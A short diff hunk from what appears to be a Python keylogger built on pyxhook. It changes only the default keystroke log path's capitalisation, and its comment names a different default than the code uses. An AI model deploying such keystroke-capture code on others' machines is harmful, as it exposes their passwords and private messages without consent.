@@ -8,7 +8,7 @@ import pyxhook
 # or use the default ~/Desktop/keylogs.log
 log_file = os.environ.get(
 	'pylogger_file',
-	os.path.expanduser('~/Logs/keylogs.log')
+	os.path.expanduser('~/logs/keylogs.log')
 )
 # Allow setting the cancel key from environment args, Default: `
 cancel_key = ord(
